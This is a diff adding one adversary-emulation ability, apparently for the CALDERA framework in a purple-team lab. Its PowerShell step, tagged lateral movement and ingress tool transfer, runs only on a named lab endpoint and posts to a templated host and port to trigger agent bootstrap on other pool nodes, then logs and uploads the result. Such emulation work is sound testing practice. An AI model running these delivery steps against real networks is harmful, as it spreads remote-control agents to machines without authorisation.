@@ -1,0 +1,28 @@
+- id: a1301002-0002-4002-8002-000000000002
+  name: ABL-S13-WIN-DELIVER-POOL-AGENTS
+  description: Trigger bootstrap delivery on pool nodes from Windows using discovered facts
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |
+          if (-not ($env:COMPUTERNAME -match '^WIN-ENDPOINT-01$|^WIN-ENDPOINT01$')) { exit 0 };
+          $node = "#{pool.target.node}";
+          $uri = "http://#{pool.target.host}:#{pool.target.port}#{pool.bootstrap.path}";
+          New-Item -ItemType Directory -Path 'C:\PurpleLab' -Force | Out-Null;
+          try {
+            $resp = Invoke-RestMethod -Uri $uri -Method Post -UseBasicParsing;
+            "S13_DELIVERY_OK host=#{pool.target.host} port=#{pool.target.port} node=$node group=$($resp.group) paw=$($resp.paw)" | Out-File 'C:\PurpleLab\s13_delivery_log.txt' -Append;
+          } catch {
+            "S13_DELIVERY_FAIL host=#{pool.target.host} port=#{pool.target.port} node=$node error=$($_.Exception.Message)" | Out-File 'C:\PurpleLab\s13_delivery_log.txt' -Append;
+          };
+          Get-Content 'C:\PurpleLab\s13_delivery_log.txt';
+        timeout: 240
+        uploads:
+          - C:\PurpleLab\s13_delivery_log.txt
+  singleton: false
+  repeatable: false
+  delete_payload: false
